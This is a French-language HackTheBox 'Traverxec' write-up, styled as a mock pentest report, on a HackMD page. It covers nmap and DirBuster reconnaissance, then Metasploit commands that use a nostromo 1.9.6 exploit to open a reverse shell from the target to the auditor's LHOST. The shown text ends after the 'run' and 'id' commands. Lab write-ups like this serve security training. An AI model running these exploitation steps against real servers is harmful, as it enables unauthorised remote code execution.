<!DOCTYPE html>

<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="mobile-web-app-capable" content="yes">
    <title>
        HackTheBox 2019 - [Pentest] Traverxec - HackMD
    </title>
    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
    <link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha256-916EbMg70RQy9LHiGkXzG8hSg9EdNy97GazNG/aiY1w=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css" integrity="sha256-3iu9jgsy9TpTwXKb7bNQzqWekRX7pPK+2OLj3R922fo=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/octicons/3.5.0/octicons.min.css" integrity="sha256-QiWfLIsCT02Sdwkogf6YMiQlj4NE84MKkzEMkZnMGdg=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.1/themes/prism.min.css" integrity="sha256-vtR0hSWRc3Tb26iuN2oZHt3KRUomwTufNIf5/4oeCyg=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@hackmd/emojify.js@2.1.0/dist/css/basic/emojify.min.css" integrity="sha256-UOrvMOsSDSrW6szVLe8ZDZezBxh5IoIfgTwdNDgTjiU=" crossorigin="anonymous" />
    <style>
        @charset "UTF-8";@import url(https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,500,500i|Source+Code+Pro:300,400,500|Source+Sans+Pro:300,300i,400,400i,600,600i|Source+Serif+Pro&subset=latin-ext);.hljs{display:block;background:#fff;padding:.5em;color:#333;overflow-x:auto}.hljs-comment,.hljs-meta{color:#969896}.hljs-emphasis,.hljs-quote,.hljs-string,.hljs-strong,.hljs-template-variable,.hljs-variable{color:#df5000}.hljs-keyword,.hljs-selector-tag,.hljs-type{color:#a71d5d}.hljs-attribute,.hljs-bullet,.hljs-literal,.hljs-number,.hljs-symbol{color:#0086b3}.hljs-built_in,.hljs-builtin-name{color:#005cc5}.hljs-name,.hljs-section{color:#63a35c}.hljs-tag{color:#333}.hljs-attr,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-title{color:#795da3}.hljs-addition{color:#55a532;background-color:#eaffea}.hljs-deletion{color:#bd2c00;background-color:#ffecec}.hljs-link{text-decoration:underline}.markdown-body{font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body>:first-child{margin-top:0!important}.markdown-body>:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body .absent{color:#c00}.markdown-body .anchor{float:left;padding-right:4px;margin-left:-20px;line-height:1}.markdown-body .anchor:focus{outline:none}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e7e7e7;border:0}.markdown-body blockquote{font-size:16px;padding:0 1em;color:#777;border-left:.25em solid #ddd}.markdown-body blockquote>:first-child{margin-top:0}.markdown-body blockquote>:last-child{margin-bottom:0}.markdown-body kbd,.popover kbd{display:inline-block;padding:3px 5px;font-size:11px;line-height:10px;color:#555;vertical-align:middle;background-color:#fcfcfc;border:1px solid #ccc;border-bottom-color:#bbb;border-radius:3px;box-shadow:inset 0 -1px 0 #bbb}.markdown-body .loweralpha{list-style-type:lower-alpha}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#000;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1 code,.markdown-body h1 tt,.markdown-body h2 code,.markdown-body h2 tt,.markdown-body h3 code,.markdown-body h3 tt,.markdown-body h4 code,.markdown-body h4 tt,.markdown-body h5 code,.markdown-body h5 tt,.markdown-body h6 code,.markdown-body h6 tt{font-size:inherit}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eee}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#777}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol.no-list,.markdown-body ul.no-list{padding:0;list-style-type:none}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li>p{margin-top:16px}.markdown-body li+li{padding-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}.markdown-body table th{font-weight:700}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #ddd}.markdown-body table tr{background-color:#fff;border-top:1px solid #ccc}.markdown-body table tr:nth-child(2n){background-color:#f8f8f8}.markdown-body img{max-width:100%;box-sizing:content-box;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body .emoji{max-width:none;vertical-align:text-top;background-color:transparent}.markdown-body span.frame{display:block;overflow:hidden}.markdown-body span.frame>span{display:block;float:left;width:auto;padding:7px;margin:13px 0 0;overflow:hidden;border:1px solid #ddd}.markdown-body span.frame span img{display:block;float:left}.markdown-body span.frame span span{display:block;padding:5px 0 0;clear:both;color:#333}.markdown-body span.align-center{display:block;overflow:hidden;clear:both}.markdown-body span.align-center>span{display:block;margin:13px auto 0;overflow:hidden;text-align:center}.markdown-body span.align-center span img{margin:0 auto;text-align:center}.markdown-body span.align-right{display:block;overflow:hidden;clear:both}.markdown-body span.align-right>span{display:block;margin:13px 0 0;overflow:hidden;text-align:right}.markdown-body span.align-right span img{margin:0;text-align:right}.markdown-body span.float-left{display:block;float:left;margin-right:13px;overflow:hidden}.markdown-body span.float-left span{margin:13px 0 0}.markdown-body span.float-right{display:block;float:right;margin-left:13px;overflow:hidden}.markdown-body span.float-right>span{display:block;margin:13px auto 0;overflow:hidden;text-align:right}.markdown-body code,.markdown-body tt{padding:0;padding-top:.2em;padding-bottom:.2em;margin:0;font-size:85%;background-color:rgba(0,0,0,.04);border-radius:3px}.markdown-body code:after,.markdown-body code:before,.markdown-body tt:after,.markdown-body tt:before{letter-spacing:-.2em;content:"\00a0"}.markdown-body code br,.markdown-body tt br{display:none}.markdown-body del code{text-decoration:inherit}.markdown-body pre{word-wrap:normal}.markdown-body pre>code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f7f7f7;border-radius:3px}.markdown-body pre code,.markdown-body pre tt{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}.markdown-body pre code:after,.markdown-body pre code:before,.markdown-body pre tt:after,.markdown-body pre tt:before{content:normal}.markdown-body .csv-data td,.markdown-body .csv-data th{padding:5px;overflow:hidden;font-size:12px;line-height:1;text-align:left;white-space:nowrap}.markdown-body .csv-data .blob-line-num{padding:10px 8px 9px;text-align:right;background:#fff;border:0}.markdown-body .csv-data tr{border-top:0}.markdown-body .csv-data th{font-weight:700;background:#f8f8f8;border-top:0}.news .alert .markdown-body blockquote{padding:0 0 0 40px;border:0 none}.activity-tab .news .alert .commits,.activity-tab .news .markdown-body blockquote{padding-left:0}.task-list-item{list-style-type:none}.task-list-item label{font-weight:400}.task-list-item.enabled label{cursor:pointer}.task-list-item+.task-list-item{margin-top:3px}.task-list-item-checkbox{float:left;margin:.31em 0 .2em -1.3em!important;vertical-align:middle;cursor:default!important}.markdown-body{padding-top:40px;padding-bottom:40px;max-width:758px;overflow:visible!important}.markdown-body .emoji{vertical-align:top}.markdown-body pre{border:inherit!important}.markdown-body code{color:inherit!important}.markdown-body pre code .wrapper{display:-moz-inline-flex;display:-ms-inline-flex;display:-o-inline-flex;display:inline-flex}.markdown-body pre code .gutter{float:left;overflow:hidden;-webkit-user-select:none;user-select:none}.markdown-body pre code .gutter.linenumber{text-align:right;position:relative;display:inline-block;cursor:default;z-index:4;padding:0 8px 0 0;min-width:20px;box-sizing:content-box;color:#afafaf!important;border-right:3px solid #6ce26c!important}.markdown-body pre code .gutter.linenumber>span:before{content:attr(data-linenumber)}.markdown-body pre code .code{float:left;margin:0 0 0 16px}.markdown-body .gist .line-numbers{border-left:none;border-top:none;border-bottom:none}.markdown-body .gist .line-data{border:none}.markdown-body .gist table{border-spacing:0;border-collapse:inherit!important}.markdown-body code[data-gist-id]{background:none;padding:0}.markdown-body code[data-gist-id]:after,.markdown-body code[data-gist-id]:before{content:""}.markdown-body code[data-gist-id] .blob-num{border:unset}.markdown-body code[data-gist-id] table{overflow:unset;margin-bottom:unset}.markdown-body code[data-gist-id] table tr{background:unset}.markdown-body[dir=rtl] pre{direction:ltr}.markdown-body[dir=rtl] code{direction:ltr;unicode-bidi:embed}.markdown-body .alert>p{margin-bottom:0}.markdown-body pre.abc,.markdown-body pre.flow-chart,.markdown-body pre.graphviz,.markdown-body pre.mermaid,.markdown-body pre.sequence-diagram,.markdown-body pre.vega{text-align:center;background-color:inherit;border-radius:0;white-space:inherit}.markdown-body pre.abc>code,.markdown-body pre.flow-chart>code,.markdown-body pre.graphviz>code,.markdown-body pre.mermaid>code,.markdown-body pre.sequence-diagram>code,.markdown-body pre.vega>code{text-align:left}.markdown-body pre.abc>svg,.markdown-body pre.flow-chart>svg,.markdown-body pre.graphviz>svg,.markdown-body pre.mermaid>svg,.markdown-body pre.sequence-diagram>svg,.markdown-body pre.vega>svg{max-width:100%;height:100%}.markdown-body pre>code.wrap{white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word}.markdown-body .alert>p,.markdown-body .alert>ul{margin-bottom:0}.markdown-body summary{display:list-item}.markdown-body summary:focus{outline:none}.markdown-body details summary{cursor:pointer}.markdown-body details:not([open])>:not(summary){display:none}.markdown-body figure{margin:1em 40px}.markdown-body .mark,.markdown-body mark{background-color:#fff1a7}.vimeo,.youtube{cursor:pointer;display:table;text-align:center;background-position:50%;background-repeat:no-repeat;background-size:contain;background-color:#000;overflow:hidden}.vimeo,.youtube{position:relative;width:100%}.youtube{padding-bottom:56.25%}.vimeo img{width:100%;object-fit:contain;z-index:0}.youtube img{object-fit:cover;z-index:0}.vimeo iframe,.youtube iframe,.youtube img{width:100%;height:100%;position:absolute;top:0;left:0}.vimeo iframe,.youtube iframe{vertical-align:middle;z-index:1}.vimeo .icon,.youtube .icon{position:absolute;height:auto;width:auto;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;opacity:.3;transition:opacity .2s;z-index:0}.vimeo:hover .icon,.youtube:hover .icon{opacity:.6;transition:opacity .2s}.slideshare .inner,.speakerdeck .inner{position:relative;width:100%}.slideshare .inner iframe,.speakerdeck .inner iframe{position:absolute;top:0;bottom:0;left:0;right:0;width:100%;height:100%}.MJX_Assistive_MathML{display:none}.ui-infobar{position:relative;z-index:2;max-width:760px;margin:25px auto -25px;padding:0 15px;color:#777}.toc .invisable-node{list-style-type:none}.ui-toc{position:fixed;bottom:20px;z-index:998}.ui-toc-label{opacity:.3;background-color:#ccc;border:none;transition:opacity .2s}.ui-toc .open .ui-toc-label{opacity:1;color:#fff;transition:opacity .2s}.ui-toc-label:focus{opacity:.3;background-color:#ccc;color:#000}.ui-toc-label:hover{opacity:1;background-color:#ccc;transition:opacity .2s}.ui-toc-dropdown{margin-top:23px;margin-bottom:20px;padding-left:10px;padding-right:10px;max-width:45vw;width:25vw;max-height:70vh;overflow:auto;text-align:inherit}.ui-toc-dropdown>.toc{max-height:calc(70vh - 100px);overflow:auto}.ui-toc-dropdown[dir=rtl] .nav{padding-right:0;letter-spacing:.0029em}.ui-toc-dropdown a{overflow:hidden;text-overflow:ellipsis;white-space:pre}.ui-toc-dropdown .nav>li>a{display:block;padding:4px 20px;font-size:13px;font-weight:500;color:#767676}.ui-toc-dropdown .nav>li:first-child:last-child > ul,.ui-toc-dropdown .toc.expand ul{display:block}.ui-toc-dropdown .nav>li>a:focus,.ui-toc-dropdown .nav>li>a:hover{padding-left:19px;color:#000;text-decoration:none;background-color:transparent;border-left:1px solid #000}.ui-toc-dropdown[dir=rtl] .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav>li>a:hover{padding-right:19px;border-left:none;border-right:1px solid #000}.ui-toc-dropdown .nav>.active:focus>a,.ui-toc-dropdown .nav>.active:hover>a,.ui-toc-dropdown .nav>.active>a{padding-left:18px;font-weight:700;color:#000;background-color:transparent;border-left:2px solid #000}.ui-toc-dropdown[dir=rtl] .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav>.active>a{padding-right:18px;border-left:none;border-right:2px solid #000}.ui-toc-dropdown .nav .nav{display:none;padding-bottom:10px}.ui-toc-dropdown .nav>.active>ul{display:block}.ui-toc-dropdown .nav .nav>li>a{padding-top:1px;padding-bottom:1px;padding-left:30px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a{padding-right:30px}.ui-toc-dropdown .nav .nav>li>ul>li>a{padding-top:1px;padding-bottom:1px;padding-left:40px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a{padding-right:40px}.ui-toc-dropdown .nav .nav>li>a:focus,.ui-toc-dropdown .nav .nav>li>a:hover{padding-left:29px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:hover{padding-right:29px}.ui-toc-dropdown .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown .nav .nav>li>ul>li>a:hover{padding-left:39px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:hover{padding-right:39px}.ui-toc-dropdown .nav .nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>a{padding-left:28px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>a{padding-right:28px}.ui-toc-dropdown .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active>a{padding-left:38px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active>a{padding-right:38px}.markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,sans-serif}html[lang^=ja] .markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ\ ゴシック,sans-serif}html[lang=zh-tw] .markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html[lang=zh-cn] .markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}html .markdown-body[lang^=ja]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ\ ゴシック,sans-serif}html .markdown-body[lang=zh-tw]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html .markdown-body[lang=zh-cn]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}html[lang^=ja] .ui-toc-dropdown{font-family:Source Sans Pro,Helvetica,Arial,Meiryo UI,MS PGothic,ＭＳ\ Ｐゴシック,sans-serif}html[lang=zh-tw] .ui-toc-dropdown{font-family:Source Sans Pro,Helvetica,Arial,Microsoft JhengHei UI,微軟正黑UI,sans-serif}html[lang=zh-cn] .ui-toc-dropdown{font-family:Source Sans Pro,Helvetica,Arial,Microsoft YaHei UI,微软雅黑UI,sans-serif}html .ui-toc-dropdown[lang^=ja]{font-family:Source Sans Pro,Helvetica,Arial,Meiryo UI,MS PGothic,ＭＳ\ Ｐゴシック,sans-serif}html .ui-toc-dropdown[lang=zh-tw]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft JhengHei UI,微軟正黑UI,sans-serif}html .ui-toc-dropdown[lang=zh-cn]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft YaHei UI,微软雅黑UI,sans-serif}.ui-affix-toc{position:fixed;top:0;max-width:15vw;max-height:70vh;overflow:auto}.back-to-top,.expand-toggle,.go-to-bottom{display:block;padding:4px 10px;margin-top:10px;margin-left:10px;font-size:12px;font-weight:500;color:#999}.back-to-top:focus,.back-to-top:hover,.expand-toggle:focus,.expand-toggle:hover,.go-to-bottom:focus,.go-to-bottom:hover{color:#563d7c;text-decoration:none}.back-to-top,.go-to-bottom{margin-top:0}.ui-user-icon{width:20px;height:20px;display:block;border-radius:3px;margin-top:2px;margin-bottom:2px;margin-right:5px;background-position:50%;background-repeat:no-repeat;background-size:cover}.ui-user-icon.small{width:18px;height:18px;display:inline-block;vertical-align:middle;margin:0 0 .2em}.ui-infobar>small>span{line-height:22px}.ui-infobar>small .dropdown{display:inline-block}.ui-infobar>small .dropdown a:focus,.ui-infobar>small .dropdown a:hover{text-decoration:none}.ui-published-note{color:#337ab7}.ui-published-note .fa{font-size:20px;vertical-align:top}.unselectable{-webkit-user-select:none;-o-user-select:none;user-select:none}@media print{blockquote,div,img,pre,table{page-break-inside:avoid!important}a[href]:after{font-size:12px!important}}.markdown-body.slides{position:relative;z-index:1;color:#222}.markdown-body.slides:before{content:"";display:block;position:absolute;top:0;left:0;right:0;bottom:0;z-index:-1;background-color:currentColor;box-shadow:0 0 0 50vw}.markdown-body.slides section[data-markdown]{position:relative;margin-bottom:1.5em;background-color:#fff;text-align:center}.markdown-body.slides section[data-markdown] code{text-align:left}.markdown-body.slides section[data-markdown]:before{content:"";display:block;padding-bottom:56.23%}.markdown-body.slides section[data-markdown]>div:first-child{position:absolute;top:50%;left:1em;right:1em;transform:translateY(-50%);max-height:100%;overflow:hidden}.markdown-body.slides section[data-markdown]>ul{display:inline-block}.markdown-body.slides>section>section+section:after{content:"";position:absolute;top:-1.5em;right:1em;height:1.5em;border:3px solid #777}body{font-smoothing:subpixel-antialiased!important;-webkit-font-smoothing:subpixel-antialiased!important;-moz-osx-font-smoothing:auto!important;text-shadow:0 0 1em transparent,1px 1px 1.2px rgba(0,0,0,.004);-webkit-overflow-scrolling:touch;letter-spacing:.025em}.focus,:focus{outline:none!important}::-moz-focus-inner{border:0!important}body{font-family:Source Sans Pro,Helvetica,Arial,sans-serif}html[lang^=ja] body{font-family:Source Sans Pro,Helvetica,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ\ ゴシック,sans-serif}html[lang=zh-tw] body{font-family:Source Sans Pro,Helvetica,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html[lang=zh-cn] body{font-family:Source Sans Pro,Helvetica,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}abbr[title]{border-bottom:none;text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted}abbr[data-original-title],abbr[title]{cursor:help}body.modal-open{overflow-y:auto;padding-right:0!important}
    </style>
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
    	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
    <![endif]-->
</head>

<body>
    <div id="doc" class="markdown-body container-fluid comment-enabled" data-hard-breaks="true" style="position: relative;"><h1 id="HackTheBox-2019---Pentest-Traverxec"><a class="anchor hidden-xs" href="#HackTheBox-2019---Pentest-Traverxec" title="HackTheBox-2019---Pentest-Traverxec"><span class="octicon octicon-link"></span></a>HackTheBox 2019 - [Pentest] Traverxec</h1><p>Rédigé par <a href="https://twitter.com/Maltemo" target="_blank" rel="noopener">Maltemo</a>, membre de l’équipe <a href="https://sinhack.blog/" target="_blank" rel="noopener">SinHack</a>.</p><p>Ce document simule un rendu de rapport de pentest.</p><h2 id="Périmètre-d’intervention"><a class="anchor hidden-xs" href="#Périmètre-d’intervention" title="Périmètre-d’intervention"><span class="octicon octicon-link"></span></a>Périmètre d’intervention</h2><p>Le client a fournit les informations suivantes à l’équipe d’audit :</p><blockquote>
<p><strong>IP cible</strong> : 10.10.10.165<br>
<strong>Famille de système d’exploitation</strong> : Linux<br>
<strong>Date de mise en production</strong> : 16/11/19</p>
</blockquote><h2 id="Outils-et-méthodes-utilisés"><a class="anchor hidden-xs" href="#Outils-et-méthodes-utilisés" title="Outils-et-méthodes-utilisés"><span class="octicon octicon-link"></span></a>Outils et méthodes utilisés</h2><p>Scan :</p><ul>
<li>NMAP</li>
<li>DirBuster</li>
</ul><p>Exploitation :</p><ul>
<li>MetaSploit</li>
</ul><p>Méthodes:</p><ul>
<li>Directory Trasversal</li>
<li>Remote Code Execution</li>
<li>Reverse Shell</li>
<li>Elevation de privilège</li>
<li>Scan de service</li>
</ul><h2 id="Phase-de-reconnaissance"><a class="anchor hidden-xs" href="#Phase-de-reconnaissance" title="Phase-de-reconnaissance"><span class="octicon octicon-link"></span></a>Phase de reconnaissance</h2><p>Etant donné la nature de l’audit (en boite noire) et le peu d’information permettant aux auditeurs de réaliser du renseignement en source ouverte sur l’entreprise, l’équipe a décidé de passer directement à la phase de scan actif.</p><h3 id="Scan-actif"><a class="anchor hidden-xs" href="#Scan-actif" title="Scan-actif"><span class="octicon octicon-link"></span></a>Scan actif</h3><h4 id="NMAP"><a class="anchor hidden-xs" href="#NMAP" title="NMAP"><span class="octicon octicon-link"></span></a>NMAP</h4><p>Ci-dessous, le rapport de scan de l’outil nmap :</p><p>Commande : <code>nmap -sC -sV -oA nmap/traverxec 10.10.10.165</code></p><p>Résultat :</p><p><img src="https://i.imgur.com/SIowPs8.png" alt="Résultat de la commande nmap sur la machine à auditer"></p><p>Ce rapport fournit à l’équipe les informations suivantes sur la machine cible :</p><ul>
<li>Le service <strong>Secure Shell</strong> est actif sur le port par défaut (TCP/22).
<ul>
<li>Les banières n’ont pas été désactivé, il nous est donc possible de déterminer la version du service : <strong>7.9p1</strong>.</li>
<li>Les clés publiques du serveur SSH sont directement accesibles par énumération du service SSH.</li>
</ul>
</li>
<li>Un serveur <strong>HTTP</strong> est actif sur le port par défaut (TCP/80).
<ul>
<li>Les banières n’ont pas été désactivé, il nous est donc possible de déterminer la version du service et le type de serveur : <strong>nostromo 1.9.6</strong>.</li>
</ul>
</li>
</ul><h4 id="Directory-Fuzzer"><a class="anchor hidden-xs" href="#Directory-Fuzzer" title="Directory-Fuzzer"><span class="octicon octicon-link"></span></a>Directory Fuzzer</h4><p>Du fait de la présence d’un serveur Web, la suite de la phase de scan actif sera axée sur ce dernier. L’équipe a donc réalisé une énumération exhaustive des fichiers et répertoires du serveur Web afin de détecter des points d’entré :</p><p>Ci-dessous le paramétrage de l’outil <strong>DirBuster</strong> :</p><p><img src="https://i.imgur.com/7D7nxkC.png" alt="Paramétrage de l'outil DirBuster"></p><p>Ci-dessous, le rapport de scan de l’outil <strong>DirBuster</strong> :</p><p><img src="https://i.imgur.com/cie0fq4.png" alt="Rapport généré par l'outil DirBuster une fois le scan terminé"></p><p>Des répertoires suspects nous retournent des codes d’erreurs 501, l’équipe a jugé judicieux de les inspecter afin de confirmer la version du serveur Web via la banière présente dans les retours d’erreurs du service HTTP.</p><p>Le serveur Web est bien en version 1.9.6 (ci-dessous le retour d’erreur et la banière nous donnant la version coïncidant avec la version fournie par nmap) :</p><p><img src="https://i.imgur.com/A97p3Xu.png" alt="Page web indiquant la version du service notromo"></p><p>A cette étape, nous disposons des informations néccessaires nous permettant de rechercher des vulnérabilités sur les services de ce serveur.</p><h2 id="Recherche-de-vulnérabilité"><a class="anchor hidden-xs" href="#Recherche-de-vulnérabilité" title="Recherche-de-vulnérabilité"><span class="octicon octicon-link"></span></a>Recherche de vulnérabilité</h2><h3 id="Recherche-de-vulnérabilité-en-sources-ouvertes"><a class="anchor hidden-xs" href="#Recherche-de-vulnérabilité-en-sources-ouvertes" title="Recherche-de-vulnérabilité-en-sources-ouvertes"><span class="octicon octicon-link"></span></a>Recherche de vulnérabilité en sources ouvertes</h3><p>Une vulnérabilité correspond à la version du serveur Web <strong>nostromo</strong> est exploitable :</p><p><a href="https://packetstormsecurity.com/files/155045/nostromo_code_exec.rb.txt" target="_blank" rel="noopener">https://packetstormsecurity.com/files/155045/nostromo_code_exec.rb.txt</a></p><p>Cette vulnérabilité doit donc être disponible dans la base de l’outil <strong>MetaSploit</strong>.</p><h2 id="Phase-d’exploitation-Utilisateur"><a class="anchor hidden-xs" href="#Phase-d’exploitation-Utilisateur" title="Phase-d’exploitation-Utilisateur"><span class="octicon octicon-link"></span></a>Phase d’exploitation Utilisateur</h2><h3 id="www-data---faille-du-service-nostromo"><a class="anchor hidden-xs" href="#www-data---faille-du-service-nostromo" title="www-data---faille-du-service-nostromo"><span class="octicon octicon-link"></span></a>www-data - faille du service nostromo</h3><p>La commande <code>search</code> permet de vérifier l’existance de l’exploit dans la base de données Metasploit, et la commande <code>use</code> permet de sélectionner l’exploit.</p><p>Commandes :</p><ul>
<li>Lancement du mode intéractif de la console metasploit.<br>
<code>msfconsole</code></li>
<li>Recherche parmis la liste d’exploit dans la base de données métasploit.<br>
<code>search nostromo</code></li>
<li>Sélectionne l’exploit que l’on souhaite utiliser avec metasploit.<br>
<code>use exploit/multi/http/nostromo_code_exec</code></li>
</ul><p>Résultats :</p><p><img src="https://media.discordapp.net/attachments/538068715321688064/658330703980920843/unknown.png" alt="Recherche et sélection de la vulnérabilité dans l'outil Metasploit"></p><p>Cette vulnérabilité se base sur deux techniques :</p><ul>
<li>Directory trasversal</li>
<li>Remote Code Execution</li>
</ul><p>Elle permet d’obtenir un reverse shell sur le compte de service du serveur Web, fournissant un accès direct au système d’exploitation.<br>
Pour ce faire, il est nécessaire de préciser l’adresse de la cible (<code>RHOSTS</code> pour Remote Hosts) et l’adresse de la machine utilisé pour réaliser l’audit (<code>LHOST</code> pour Local Host).</p><p>Commandes :</p><pre><code class="bash hljs"><span class="hljs-built_in">set</span> RHOSTS 10.10.10.165
<span class="hljs-built_in">set</span> LHOST 10.10.19.35
run
id
